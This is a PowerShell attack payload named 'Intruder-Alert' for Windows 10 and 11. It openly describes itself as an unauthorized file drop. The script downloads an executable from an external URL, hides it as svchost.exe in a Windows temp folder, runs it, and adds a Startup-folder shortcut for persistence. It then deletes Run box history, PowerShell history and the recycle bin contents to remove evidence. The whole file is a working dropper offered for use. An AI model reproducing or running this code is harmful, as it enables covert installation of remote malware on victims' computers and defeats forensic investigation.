# Intruder-Alert
# Author: spac3gh0st
# Description: This payload is meant to do an unauthorized file drop and execute it in a powershell script. See README.md file for more details.
# Target: Windows 10, 11
#
# Define the executable filename as a variable
$varName = "svchost.exe"

# Step 1: Create the directory C:\Windows\Temp\Cache
try {
    mkdir "$env:windir\temp\Cache" -ErrorAction Stop
    Write-Host "Directory C:\Windows\Temp\Cache created successfully."
} catch {
    Write-Host "Failed to create directory: $_"
}

# Step 2: Skip the Windows Defender exclusion since it requires elevated privileges

# Step 3: Download the file from Dropbox to C:\Windows\Temp\Cache using the $varName variable
try {
    $hookurl = "$dc"  # URL to be replaced with actual URL or passed as a parameter
    $outputFile = "$env:windir\temp\Cache\$varName"
    Invoke-WebRequest -Uri $hookurl -OutFile $outputFile -ErrorAction Stop
    Write-Host "$varName downloaded successfully to C:\Windows\Temp\Cache."
} catch {
    Write-Host "Failed to download file: $_"
}

# Step 4: Execute the downloaded file
try {
    Start-Process $outputFile -ErrorAction Stop
    Write-Host "$varName executed successfully."
} catch {
    Write-Host "Failed to execute svchost.exe: $_"
}

# Step 5: Create a shortcut to the executable in the startup folder
try {
    $shortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$varName.lnk"
    $s = (New-Object -COM WScript.Shell).CreateShortcut($shortcutPath)
    $s.TargetPath = $outputFile
    $s.Save()
    Write-Host "Shortcut for $varName created successfully in Startup folder."
} catch {
    Write-Host "Failed to create shortcut: $_"
}
############################################################################################################################################################

#Credit goes to i-am-Jakoby, Luther, & Hobo. Amazing person and hacker.  
<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		
############################################################################################################################################################

# Need to configure this in
# Popup message to signal the payload is done
#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)

